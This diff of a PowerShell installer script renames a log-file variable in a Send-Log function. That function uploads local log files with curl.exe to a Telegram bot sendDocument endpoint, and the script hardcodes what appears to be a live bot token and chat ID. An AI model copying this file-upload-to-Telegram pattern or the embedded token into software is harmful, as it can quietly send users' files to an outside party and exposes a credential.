@@ -1,12 +1,12 @@
 $setup_path = 'script'
 $install_app_log_file_path = 'C:/install_app.log'
-$auto_update_log_file_path = 'C:/install_app.log'
+$install_tool_log_file_path = 'C:/install_tool.log'
 $Uri = "https://api.telegram.org/bot7758334928:AAEM-PqCzWFn7M_11dcS5Xlev9PS1lgDJNo/sendDocument"
 $ChatId = "-4583989930"
 
 function Send-Log {
     curl.exe -F "chat_id=$ChatId" -F "document=@$install_app_log_file_path" $Uri
-    curl.exe -F "chat_id=$ChatId" -F "document=@$auto_update_log_file_path" $Uri
+    curl.exe -F "chat_id=$ChatId" -F "document=@$install_tool_log_file_path" $Uri
 }
 
 function Clean {
